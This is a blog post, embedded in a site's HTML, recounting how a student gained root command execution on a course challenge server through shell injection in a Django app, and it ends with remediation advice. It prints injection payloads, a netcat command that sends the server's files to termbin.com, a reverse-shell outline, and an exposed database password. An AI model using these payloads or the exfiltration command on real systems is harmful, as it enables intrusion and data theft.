@@ -1,0 +1,593 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.8.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/icon/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/icon/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/icon/favicon-16x16.png">
+  <link rel="mask-icon" href="/images/icon/safari-pinned-tab.svg" color="#222">
+  <link rel="manifest" href="/images/icon/site.webmanifest">
+  <meta name="msapplication-config" content="/images/icon/browserconfig.xml">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('https://tripack45.github.io').hostname,
+    root: '/',
+    scheme: 'Pisces',
+    version: '7.6.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}
+  };
+</script>
+
+  <meta name="description" content="Recently I’ve been taking VE475 cryptography. This is final CS course I will take here in JI. Frankly, the course is mind challenging, yet informative. It’s time well-spent in short. So there is this">
+<meta name="keywords" content="Hacking,Tools,Web security">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Cracking the VE475 Challenge 2 Server">
+<meta property="og:url" content="https://tripack45.github.io/2018/07/07/crackc2/index.html">
+<meta property="og:site_name" content="Patricium">
+<meta property="og:description" content="Recently I’ve been taking VE475 cryptography. This is final CS course I will take here in JI. Frankly, the course is mind challenging, yet informative. It’s time well-spent in short. So there is this">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://tripack45.github.io/images/django_debug.png">
+<meta property="og:image" content="https://tripack45.github.io/images/django_exception.png">
+<meta property="og:updated_time" content="2021-05-06T21:57:52.624Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Cracking the VE475 Challenge 2 Server">
+<meta name="twitter:description" content="Recently I’ve been taking VE475 cryptography. This is final CS course I will take here in JI. Frankly, the course is mind challenging, yet informative. It’s time well-spent in short. So there is this">
+<meta name="twitter:image" content="https://tripack45.github.io/images/django_debug.png">
+
+<link rel="canonical" href="https://tripack45.github.io/2018/07/07/crackc2/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>Cracking the VE475 Challenge 2 Server | Patricium</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Patricium</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">He had three chairs.</p>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives" rel="section"><i class="fa fa-fw fa-tasks"></i>Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-resume/cv">
+
+    <a href="/cv" rel="section"><i class="fa fa-fw fa-pencil"></i>Resume/CV</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about" rel="section"><i class="fa fa-fw fa-user"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories" rel="section"><i class="fa fa-fw fa-th"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope="" itemtype="http://schema.org/Article" class="post-block " lang="en">
+    <link itemprop="mainEntityOfPage" href="https://tripack45.github.io/2018/07/07/crackc2/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://secure.gravatar.com/avatar/da291af05e5e720bc535f8bf6063a590?s=400">
+      <meta itemprop="name" content="Yue Yao">
+      <meta itemprop="description" content="He likes Programming Languages, well-designed Systems and Good Stories. He just got his MSc in Computer Science from Carnegie Mellon.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Patricium">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Cracking the VE475 Challenge 2 Server
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2018-07-07 00:04:50" itemprop="dateCreated datePublished" datetime="2018-07-07T00:04:50+00:00">2018-07-07</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/Tech/" itemprop="url" rel="index">
+                    <span itemprop="name">Tech</span>
+                  </a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/Tech/Security/" itemprop="url" rel="index">
+                    <span itemprop="name">Security</span>
+                  </a>
+                </span>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/2018/07/07/crackc2/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2018/07/07/crackc2/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>Recently I’ve been taking VE475 cryptography. This is final CS course I will take here in JI. Frankly, the course is mind challenging, yet informative. It’s time well-spent in short. So there is this challenge, a bonus project, which asks student to write their own ciphers and attack against each other. Attacks are conducted through a web server. Basically you can access a website that allows you preform cryptographic attacks. Now I’ve able to discover a seriers of the security issues that eventually allows me to take full control of the server.</p>
+<a id="more"></a>
+<h1 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h1><p>The most powerful cryptographic attack you can run, on any ciphers, are <em>Chosen Cipher and Plaintext Attack (CPCA)</em> attacks. You can do the following:</p>
+<ul>
+<li>Choose any plain text, ask a cipher to encrypt it with arbitrarily chosen key.</li>
+<li>Choose any cipher text, ask a cipher to decrypt is with any key of your choice.</li>
+</ul>
+<p>Essentially, you can test the cipher with lots of strings, and try to collect information that well help to understand the cihper.<br>The ultimate target of this challenge, is to use these functionalities, to recover the plaintext of a given cipher text. </p>
+<p>Now each group participating the challenge will submit their cipher in the form of a binary executable. The executable takes a few arguments that allows encryption, decryption and key generation. As one would easily imagine. The web server will probably </p>
+<ul>
+<li>Receive HTTP messages from user. Operations to run (encrypt, decrypt or keygen), cipher text / plain text will probably be part of the HTTP request.</li>
+<li>Parse the request, extract relevant data.</li>
+<li>Pass them to the executable.</li>
+<li>Collect the standard output. </li>
+<li>Wrap and return the information to the user.</li>
+</ul>
+<h1 id="The-Exploit"><a href="#The-Exploit" class="headerlink" title="The Exploit"></a>The Exploit</h1><p>Now as part of the instinct of a developer, I bring up the network monitor in Chrome as I run a attack on a cipher. An <code>HTTP</code> <code>POST</code> request is issued to the address <code>http://202.121.180.24:2425/attack/cpca/1-1</code>. In the <code>POST</code> payload, three key value pairs are observed:</p>
+<ul>
+<li><code>whom</code> : The target of the cryptographic attack.</li>
+<li><code>op</code> : What to do with the target cipher.</li>
+<li><code>text</code> : The string to decypt or encypt.</li>
+<li><code>key</code> : Key used.</li>
+</ul>
+<p>Of course, I’m just guessing their functionality based on key name. Nevertheless, I blindly issued a <code>POST</code> to that URL with no payload provided at all. Normally, a web server should return an <code>HTTP 404</code>, or <code>HTTP 400</code>, sometimes <code>HTTP 500</code> at worst. However, here what I got from the server.</p>
+<p><img src="/images/django_debug.png" alt="A Django debug page from c2 server"><span class="image-caption">A Django debug page from c2 server</span></p>
+<p>Those who have worked with Django should immediatly recogonize it as the Django debug page. This is what the web server renders, when an internal exception is raised, in Debug mode. This page contains tons of security critical information, including </p>
+<ul>
+<li>Django runtime information. What is the version of Python and Django, etc.</li>
+<li>Server settings, e.g. absolute path of working directories, database connections settings (fortunately passwords are hashed). </li>
+<li><strong>Code around the point where exeception is raised.</strong></li>
+</ul>
+<p>Now let’s examine the code around the exception:</p>
+<p><img src="/images/django_exception.png" alt="Code around the point of exception"><span class="image-caption">Code around the point of exception</span></p>
+<p>Values of all local variables are shown. Look at line 42. Exception happens when trying to extract <code>choice</code> from request payload. Since the request payload is empty, this of course fails with exceptions. </p>
+<p>More interesting happens on line 47. Line 47 contains how user submitted strings are combined and sent to ciphers. Notice that strings are not escaped. </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.popen(<span class="string">"data/%s/c2 --%s \'%s\' -k data/%s/keyfile.txt"</span> % (whom, op, request.POST[<span class="string">'text'</span>],whom)</span><br></pre></td></tr></table></figure>
+<p>Let’s fix <code>whom</code> as <code>5-1</code> and <code>op</code> as <code>encypt</code>. Normally, if you try to encrypt <code>abc</code>, the command executed will be <code>data/5-1/c2 --encrypt &#39;abc&#39; -k data/5-1/keyfile.txt</code>. However, since the cipher text is not escaped, we can pull off something similar to SQL injections. </p>
+<p>Let’s say we input <code>abc&#39; &amp;&amp; echo 123 &amp;&amp; ls &#39;</code>. The command will be:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data/5-1/c2 --encrypt <span class="string">'abc'</span> &amp;&amp; <span class="built_in">echo</span> 123 &amp;&amp; ls <span class="string">''</span> -k data/5-1/keyfile.txt<span class="string">"</span></span><br></pre></td></tr></table></figure>
+<p>This is three commands exectuted in series. You first encrypt <code>abc</code> with default key, then <code>echo 123</code> to screen, and finally run the <code>ls</code> command. The output will the output of three commands combined. It will be something like <code>$CIPHER_TEXT_OF_ABC 123 data/5-1/keyfile.txt</code>. </p>
+<p>By replacing the <code>echo</code> command with other commands, we are able to run arbitrary code on the webserver. This completes an remote arbitrary code execution exploit. </p>
+<p>Out of curiosity I inputed <code>abc&#39; &amp;&amp; whoami &amp;&amp; ls &#39;</code>. This checks what is the current user. Since the <code>popen()</code> call is issued by the web server, it would inherit the user from that process. If done right, the user should be something like <code>www-data</code>, which has minimum privilege in case of breaches like this one. However, surprisingly, <code>root</code> pops out. </p>
+<p>Now I have full control of the server.</p>
+<h1 id="Impact-of-the-exploit"><a href="#Impact-of-the-exploit" class="headerlink" title="Impact of the exploit"></a>Impact of the exploit</h1><p>Now the next question is what can we do with such exploit. Being <code>root</code> and being able to run arbitrary command essentially allows me to cause any amount of damage as I like. For example, change the password to lock everyone out, or delete every file in the server. That’s pretty large impact. </p>
+<p>However, even without <code>root</code> access, the problem is severe as hell. At first glance, one might feel that our hands are pretty limited. Since we don’t have an interactive shell, any command that requires interactive shell will not succeed. And only stdout is collected and sent back to user, not error messages. </p>
+<p>Well, first of all, one could choose to redirect the error message to a file, and use a separate command to examine that file. For example, <code>abc&#39; &amp;&amp; mysql -v 2&gt; ~/err &amp;&amp; ls &#39;</code> will try to access the <code>mysql</code> database. If the access succeeds, we will be able to see the result of <code>ls</code>. So if we know it fails, we could check the file by a second <code>cat</code> command. </p>
+<p>Secondly, many interactive tools have their scripting compatible counterparts. This is mainly because often programer would want to use them in scripts. For example, <code>adduser</code> is an interactive tool, while <code>useradd</code> is the low-level pure commandline tool. So many can be done without an interactive shell.</p>
+<p>Thirdly, by issueing <code>ls</code>, <code>cat</code>, and <code>find</code> commands, we will able to look at any file we want. We could:</p>
+<ul>
+<li><code>find .</code> to recursively list out every file.</li>
+<li><code>cat</code> interesting files. For example <code>settings.py</code> for Django.</li>
+</ul>
+<p>That’s exactly how I find the Django database settings:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">DATABASES = &#123;<span class="string">'default'</span>: </span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="string">'ENGINE'</span>: <span class="string">'django.db.backends.mysql'</span>,</span><br><span class="line">                     <span class="string">'NAME'</span>: <span class="string">'c2'</span>,</span><br><span class="line">                     <span class="string">'USER'</span>: <span class="string">'root'</span>,</span><br><span class="line">                     <span class="string">'PASSWORD'</span>: <span class="string">'&#125;SisGheec4'</span>,</span><br><span class="line">                     <span class="string">'HOST'</span>: <span class="string">'localhost'</span>,</span><br><span class="line">                     <span class="string">'PORT'</span>: <span class="string">'3306'</span>, </span><br><span class="line">                 &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>We can also download every file in the working directories. There do exists online pastebins that are easily accessible from command line, e.g. <a href="http://termbin.com/" target="_blank" rel="noopener">termbin</a>. You can post things by simply send text to <code>termbin.com:9999</code> using <code>netcat</code>. The following command would <code>tar</code> the entire working directory, Base64 it, and send it to pastebin: <code>abc&#39; &amp;&amp; tar -c ../c2 | netcat termbin.com:9999 &amp;&amp; ls&#39;</code>.</p>
+<p>In mordern systems, usually the program <code>netcat</code> is not installed by default for security reasons. It is simply too easy to acquire a remote shell using <code>netcat</code>. However, there exits pre-compiled staticly linked binary of <code>netcat</code> on GitHub, see <a href="https://github.com/andrew-d/static-binaries" target="_blank" rel="noopener">Andrew-d/static-binaries</a>. Execute <code>wget</code> on the server and pull down the binary. </p>
+<p>The final exploit, and the most powerful one, is getting an interactive shell on the remote machine. The key is to utilize <code>netcat</code>. The <code>netcat</code> program is a tool that can preform TCP / UDP operationsl You can ask it connect to a remote location, or listen a local port for incomming connections. It has an option <code>-e</code>, which instructs the <code>netcat</code> to send the text it receives as argument of a selected program, and send the output to the remote computer. Executing <code>netcat -e</code> with <code>/bin/sh</code> essentiallly connect the input and output of <code>/bin/sh</code> program to a TCP connection, forming a remote shell.</p>
+<p>Well unfortunately this won’t for our particular case, because our server is hidden behind virtualizations. It is running inside a container. Unless the host system decides to expose particular ports, the container cannot listen on any port of the host. However, what we could do, is to form a reverse shell. Instead of intiating the connection from our machine, we initial the TCP connection from the target to our machine. Of course this will expose the exact IP address of the attacker, unless using reverse proxy. </p>
+<p>Having a remote shell, well, basically gives us everything we need.</p>
+<h1 id="Security-Discussion"><a href="#Security-Discussion" class="headerlink" title="Security Discussion"></a>Security Discussion</h1><p>With those serious consequences we must ask how the hell does this happens. </p>
+<p>First of all, the developer fails to sanitize the program for production. Usually development program and production program must take different configurations. In the config file for Django, namely the <code>settings.py</code>, the <code>DEBUG = True</code> line has the following comment:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># SECURITY WARNING: don't run with debug turned on in production!</span></span><br><span class="line">DEBUG = <span class="literal">True</span></span><br></pre></td></tr></table></figure>
+<p>If you follow Django official guidelines, you will also be notified to turn off debug for production. Essentially that’s human mistake resulting from ignorance of security hazards. </p>
+<p>Secondly, the developers assumed that users will only “play nice”. Well, since the user will be able to forge almost any request sent from “browsers”, one should never trust user inputs. Application programs must always validate the payload of the request. If you are doing a case by case treatment for user data, always include a default case. From the procedural abstraction point of view, view handlers should always be total functions. </p>
+<p>This is especially true for code related user code. If the user submission is going to be somehow executed, no matter on an database engine, or in our case, in bash shell, one must always sanitize them. This includes escaping, rejecting malicious ones, etc. <em>Never write your own sanitizing function.</em> Use a library provided one. Escaping is very hard to done right. </p>
+<p>The final note is to avoid the temptation of running everything as root. We have significant discussion about this in VE482, however I guess people simply ignores the warnings, or down-plays them, until they are hit by one actual breach. User group will be a good last line of defense. </p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Hacking/" rel="tag"># Hacking</a>
+              <a href="/tags/Tools/" rel="tag"># Tools</a>
+              <a href="/tags/Web-security/" rel="tag"># Web security</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2018/05/30/datalab/" rel="prev" title="Real Smart Compilers">
+      <i class="fa fa-chevron-left"></i> Real Smart Compilers
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2018/11/03/edit-compile-run/" rel="next" title="The edit-compile-run loop and programmer happiness">
+      The edit-compile-run loop and programmer happiness <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    
+  <div class="comments" id="comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+    </div>
+  </div>
+  
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Background"><span class="nav-number">1.</span> <span class="nav-text">Background</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#The-Exploit"><span class="nav-number">2.</span> <span class="nav-text">The Exploit</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Impact-of-the-exploit"><span class="nav-number">3.</span> <span class="nav-text">Impact of the exploit</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Security-Discussion"><span class="nav-number">4.</span> <span class="nav-text">Security Discussion</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Yue Yao" src="https://secure.gravatar.com/avatar/da291af05e5e720bc535f8bf6063a590?s=400">
+  <p class="site-author-name" itemprop="name">Yue Yao</p>
+  <div class="site-description" itemprop="description">He likes Programming Languages, well-designed Systems and Good Stories. He just got his MSc in Computer Science from Carnegie Mellon.</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+        
+          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags">
+          
+        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/tripack45" title="GitHub → https://github.com/tripack45" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:patrick.yaoyue@gmail.com" title="E-Mail → mailto:patrick.yaoyue@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://peiyuanqi.me/" title="https://peiyuanqi.me/" rel="noopener" target="_blank">Peyuan Qi's Website</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://zzhou612.com/" title="https://zzhou612.com/" rel="noopener" target="_blank">Nathan Zhou's Website</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://me.xlk.me/" title="https://me.xlk.me/" rel="noopener" target="_blank">Luke Xuan's Page</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://nomadtype.ninja/" title="https://nomadtype.ninja/" rel="noopener" target="_blank">Tony Su's Blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://zhxchen17.github.io/" title="https://zhxchen17.github.io/" rel="noopener" target="_blank">ZhxChen17's Blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://c-t-a.me/" title="https://c-t-a.me/" rel="noopener" target="_blank">Tong'an Cai's Page</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://jasonqsy.github.io/" title="https://jasonqsy.github.io/" rel="noopener" target="_blank">Jason Qian's Page</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.gaotong.rocks/" title="https://blog.gaotong.rocks/" rel="noopener" target="_blank">Tong Gao's Blog</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Yue Yao</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Theme – <a href="https://pisces.theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.6.0
+  </div>
+  <div class="addthis_inline_share_toolbox">
+    <script src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5a8aeee2a1b4553a" async="async"></script>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/pisces.js"></script>
+<script src="/js/next-boot.js"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+<script>
+  function loadCount() {
+    var d = document, s = d.createElement('script');
+    s.src = 'https://Patricium.disqus.com/count.js';
+    s.id = 'dsq-count-scr';
+    (d.head || d.body).appendChild(s);
+  }
+  // defer loading until the whole page loading is completed
+  window.addEventListener('load', loadCount, false);
+</script>
+<script>
+  function loadComments() {
+    if (window.DISQUS) {
+      DISQUS.reset({
+        reload: true,
+        config: {page: {
+            url: "https://tripack45.github.io/2018/07/07/crackc2/",
+            identifier: "2018/07/07/crackc2/",
+            title: "Cracking the VE475 Challenge 2 Server"
+          }
+        }
+      });
+    } else {
+      var d = document, s = d.createElement('script');
+      s.src = 'https://Patricium.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', '' + +new Date());
+      (d.head || d.body).appendChild(s);
+    }
+  }
+    window.addEventListener('load', loadComments, false);
+</script>
+
+</body>
+</html>
